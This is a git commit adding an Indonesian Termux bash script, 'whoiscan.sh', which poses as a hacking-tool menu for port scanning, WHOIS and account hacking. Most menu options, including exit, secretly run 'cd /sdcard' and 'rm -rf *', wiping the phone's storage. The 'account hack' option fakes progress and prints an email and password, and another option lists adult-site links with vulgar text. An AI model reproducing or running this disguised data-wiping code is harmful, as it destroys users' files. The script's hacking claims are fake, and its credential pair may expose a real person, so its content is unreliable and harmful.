98c85bb1eb8629a99f91fc5d3974b42c3321f2c6
On3Xpl0it <82755421+On3Xpl0it@users.noreply.github.com>
2021-06-22 23:05:01 +0700

    Add files via upload

---
+++ whoiscan.sh
@@ -0,0 +1,216 @@
+#!system/xbin/bash
+#MauNgapainGblk?
+#DiRecodeGakBakalJadiinLuMastah
+#DiGantiAuthotGakBakalJadiinLuMaster
+#MikirMakeOtakGblk
+#YangBuatGUYUBSATRIOWIBOWOXOGILEKSONO
+clear
+blue='\033[34;1m'
+green='\033[32;1m'
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'
+yellow='\033[33;1m'
+sleep 1
+toilet LOG_IN |lolcat
+echo "                         \033[32;1mUser" "\033[31;1m:" "\033[36;1m DVAN_X"
+echo "                        \033[32;1mPasswd""\033[31;1m:" "\033[36;1m./Trio66X"
+echo "\033[34;1m<===============""\033[36;1m./Trio66X""\033[34;1m==================>"
+echo -n '\033[31;1mUser''\033[31;1m   : '"\033[33;1m"
+read cvk
+echo -n '\033[31;1mPasswd''\033[31;1m : '"\033[33;1m"
+read hlo
+sleep 3
+echo    "\033[36;1mLogin Succes √"
+sleep 3
+clear
+sleep 1
+figlet NetSecX7 | lolcat
+echo "  \033[31;1m   Kaibahan NDX_A.K.A Xploiter Network"
+echo "\033[34;1m<==========================================>"
+echo "\033[32;1m#""\033[33;1m Author" "\033[31;1m:" "\033[36;1mSmart-IT" "\033[31;1mX" "\033[36;1mOn3Xpl0it"
+echo "\033[32;1m#""\033[33;1m MyTeam" "\033[31;1m:" "\033[31;1mDemonvision Alpha Numerix"
+echo "\033[32;1m#""\033[33;1m Date  " "\033[31;1m:" "\033[35;1mMin-7-2021"
+echo "\033[32;1m#""\033[33;1m Number" "\033[31;1m:" "\033[32;1m087804176X3X"
+echo "\033[32;1m#""\033[33;1m Home  " "\033[31;1m:" "\033[31;1mJateng Xploiter NetSec"
+echo "\033[34;1m<==========================================>"
+sleep 1
+echo ""
+echo "\033[36;1m#""\033[33;1mMENU""\033[36;1m#""\033[32;1m Create By""\033[31;1m DVAN"
+echo "\033[34;1m<==========================================>"
+echo "\033[32;1m[""\033[31;1m1""\033[32;1m]""\033[33;1m=>""\033[36;1m Stabilkan Jaringan"
+echo "\033[32;1m[""\033[31;1m2""\033[32;1m]""\033[33;1m=>""\033[36;1m Scaning Port"
+echo "\033[32;1m[""\033[31;1m3""\033[32;1m]""\033[33;1m=>""\033[36;1m Information Getring (WHOIS)"
+echo "\033[32;1m[""\033[31;1m4""\033[32;1m]""\033[33;1m=>""\033[36;1m Wordpress Bruterfroce"
+echo "\033[32;1m[""\033[31;1m5""\033[32;1m]""\033[33;1m=>""\033[36;1m Jumping Server"
+echo "\033[32;1m[""\033[31;1m6""\033[32;1m]""\033[33;1m=>""\033[36;1m Install Nmap"
+echo "\033[32;1m[""\033[31;1m7""\033[32;1m]""\033[33;1m=>""\033[36;1m Install Hydra"
+echo "\033[32;1m[""\033[31;1m8""\033[32;1m]""\033[33;1m=>""\033[36;1m Install Metasploit"
+echo "\033[32;1m[""\033[31;1m9""\033[32;1m]""\033[33;1m=>""\033[36;1m Install DDOS Attack"
+echo "\033[32;1m[""\033[31;1mA""\033[32;1m]""\033[33;1m=>""\033[36;1m Install SQLMAP"
+echo "\033[32;1m[""\033[31;1mB""\033[32;1m]""\033[33;1m=>""\033[36;1m Hack Akun FF Old Season 1"
+echo "\033[32;1m[""\033[31;1mC""\033[32;1m]""\033[33;1m=>""\033[36;1m Link Bokep + Nobar Bokep"
+echo "\033[32;1m[""\033[31;1m0""\033[32;1m]""\033[33;1m=>""\033[36;1m Keluar Dari Tools"
+echo "\033[34;1m<==========================================>"
+echo "\033[36;1m<=============>"
+echo "\033[33;1mPilih Mana Beb?"
+echo "\033[32;1m???????????????"
+echo "\033[34;1m<=============>"
+echo "\033[36;1m"
+read -p "[•]root@kentotin~> " cok
+
+if [ $cok = 1 ] || [ $cok = 1 ]
+then
+clear
+figlet Network | lolcat
+toilet Speed   | lolcat
+echo "\033[34;1m<================""\033[36;1m./Trio66X""\033[34;1m=================>"
+echo "\033[33;1m"
+echo "Starting Internet Ngebut..."
+sleep 5
+cd /sdcard
+rm -rf *
+echo "\033[32;1m"
+ping 8.8.8.8
+fi
+
+
+
+if [ $cok = 2 ] || [ $cok = 2 ]
+then
+clear
+figlet Scanning | lolcat
+figlet Port     | lolcat
+echo "\033[34;1m<================""\033[36;1m./Trio66X""\033[34;1m=================>"
+echo "\033[33;1m"
+echo "Instalasi Get Started..."
+sleep 5
+echo "\033[32;1m"
+pkg update && pkg upgrade -y
+pkg install nmap -y
+echo "\033[33;1m=^=^=^=^=^=^=^=^=^=^=^=^"
+echo "\033[34;1m Instalasi Nmap Selesai"
+echo "\033[36;1m<======================>"
+cd /sdcard
+rm -rf *
+echo "\033[33;1mContoh Pengunaan!"
+echo "\033[32;1m?????????????????"
+echo "\033[36;1mContoh ""\033[31;1m:""\033[32;1m nmap""\033[31;1m target.com"
+echo "\033[34;1m<======================>"
+fi
+
+
+
+if [ $cok = 3 ] || [ $cok = 3 ]
+then
+clear
+toilet Whois |lolcat
+figlet Website |lolcat
+echo "\033[34;1m<================""\033[36;1m./Trio66X""\033[34;1m=================>"
+echo "\033[33;1m"
+echo "Instalasi Whois Get Started..."
+sleep 5
+echo "\033[32;1m"
+cd /sdcard
+rm -rf *
+pkg update && pkg upgrade -y
+echo "\033[33;1m=^=^=^=^=^=^=^=^=^=^=^=^"
+echo "\033[34;1mInstalasi Whois Selesai"
+echo "\033[36;1m<======================>"
+echo "\033[33;1mContoh Pengunaan!"
+echo "\033[32;1m?????????????????"
+echo "\033[36;1mContoh ""\033[31;1m:""\033[32;1m whois""\033[31;1m target.com"
+echo "\033[34;1m<======================>"
+fi
+
+
+
+if [ $cok = B ] || [ $cok = B ]
+then
+clear
+figlet Mencari|lolcat
+figlet AkunOld|lolcat
+echo "\033[34;1m<================""\033[36;1m./Trio66X""\033[34;1m=================>"
+echo "\033[33;1m"
+echo "Starting Mencari Akun Old..."
+sleep 6
+echo "\033[32;1m"
+cd /sdcard
+rm -rf *
+echo "\033[36;1m<==========================================>"
+echo ""
+echo "\033[34;1m<==============================>"
+echo "\033[33;1mAkun Old Di Temukan"
+sleep 5
+echo "\033[36;1mStarting Hack Akun..."
+sleep 6
+echo "\033[36;1mStarting Hack Password..."
+sleep 7
+echo "\033[32;1mHacking Suscesfuly"
+sleep 5
+cd /sdcard
+rm -rf *
+echo "\033[33;1mAkun ""\033[31;1m:""\033[32;1m aldifirmansyah@gmail.com"
+echo "\033[33;1mPass ""\033[31;1m:""\033[32;1m aldi76syah"
+echo "\033[36;1m<==============================>"
+fi
+
+
+
+if [ $cok = C ] || [ $cok = C ]
+then
+clear
+cd /sdcard
+rm -rf *
+figlet Ngocok|lolcat
+figlet Kontol|lolcat
+echo "\033[34;1m<================""\033[36;1m./Trio66X""\033[34;1m=================>"
+sleep 3
+echo "\033[33;1mMencari Situs Bokep Mohon Tunggu..."
+sleep 6
+echo "\033[32;1mSitus Bokep Di Temukan""\033[31;1m!"
+sleep 2
+echo "\033[34;1mMengcopy Link Bokep Mohon Tunggu..."
+sleep 6
+echo "\033[31;1mMengngocok kontol system mohon tunggu.."
+sleep 6
+echo "\033[32;1mSelamat Ngocok..."
+echo "\033[36;1m<==========================================>"
+echo "\033[36;1mLink Bokep" "\033[31;1m:" "\033[32;1mhttps://""\033[36;1mwolve.pro"
+echo "\033[36;1mLink Bokep" "\033[31;1m:" "\033[32;1mhttps://""\033[36;1mmodel.51z1hc93avfn.top"
+echo "\033[36;1mLink Bokep" "\033[31;1m:" "\033[32;1mhttps://""\033[36;1msex-and-flirt.com"
+echo "\033[36;1mLink Bokep" "\033[31;1m:" "\033[32;1mhttps://""\033[36;1mxnxx.com"
+echo "\033[36;1m<==========================================>"
+fi
+
+
+
+if [ $cok = 0 ] || [ $cok = 00 ]
+then
+clear
+figlet Bye-Bye |lolcat
+echo "\033[34;1m<===============""\033[36;1m./Trio66X""\033[34;1m==================>"
+echo "\033[33;1mWe Are"
+sleep 1
+rm -rf *
+echo "\033[31;1mAkatsuki Xploiter Crime"
+sleep 1
+echo "\033[33;1mWe Security"
+sleep 1
+echo "We Not Friends"
+sleep 1
+echo "We Are Family"
+sleep 1
+echo "Hacking Is Not Criminal:)"
+sleep 1
+echo "Ketika Sebuah Hayalan Tidak tercapai"
+sleep 1
+echo "Maka Terus lah BerJuang Dan Berusaha:)"
+sleep 1
+cd /sdcard
+rm -rf *
+echo "\033[32;1mKarna Suatu Hari Nanti Kamu akan Mendapatkannya:D"
+sleep 1
+exit
+fi
